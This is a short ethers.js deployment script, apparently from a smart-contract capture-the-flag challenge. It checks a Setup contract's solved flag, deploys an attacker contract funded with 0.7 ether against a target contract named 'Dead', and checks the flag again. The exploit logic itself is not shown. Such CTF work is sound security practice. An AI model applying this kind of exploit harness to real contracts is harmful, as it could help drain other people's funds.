const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("kankan0Attacker");

  const setup = await ethers.getContractAt( "Setup", "0x9e6C0511d07695420A0B57003d6e8c133Cd0185d" );
  const ctf = await ethers.getContractAt( "Dead", "0x7e18A61fd65F5E5Cf693257235a0A1F360aBE7d8" );

  console.log("solved:", await setup.isSolved());

  await EXPLOIT.deploy(ctf.address, { value: parseEther("0.7") });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
